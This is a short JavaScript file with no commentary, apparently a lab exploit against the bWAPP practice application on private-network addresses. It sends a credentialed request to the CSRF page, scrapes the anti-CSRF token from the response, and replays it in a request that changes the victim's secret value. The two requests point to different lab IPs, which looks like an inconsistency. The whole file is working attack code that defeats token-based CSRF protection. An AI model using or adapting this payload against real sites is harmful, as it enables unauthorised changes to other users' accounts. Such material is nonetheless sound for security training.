var url = "http://192.168.1.58/bWAPP/csrf_3.php";
if (window.XMLHttpRequest){
    xmlHttp = new XMLHttpRequest();
} else {
    xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
}
xmlHttp.withCredentials = true;
var hacked = false;
xmlHttp.onreadystatechange = function(){
    if (xmlHttp.readyState == 4 && xmlHttp.status == 200){
        var text = xmlHttp.responseText;
        var parser = new DOMParser();
        var parsedDoc = parser.parseFromString(text, "text/html");
        var token = parsedDoc.getElementsByName("token").item(0).value;
        var newUrl = "http://192.168.1.128/bWAPP/csrf_3.php?secret=SECRET&action=change&token=" + token;
        if(!hacked){
            hacked = true;
            xmlHttp.open("GET", newUrl, false );
            xmlHttp.send();  
        }
    }
};
xmlHttp.open("GET", url, false );
xmlHttp.send(); 
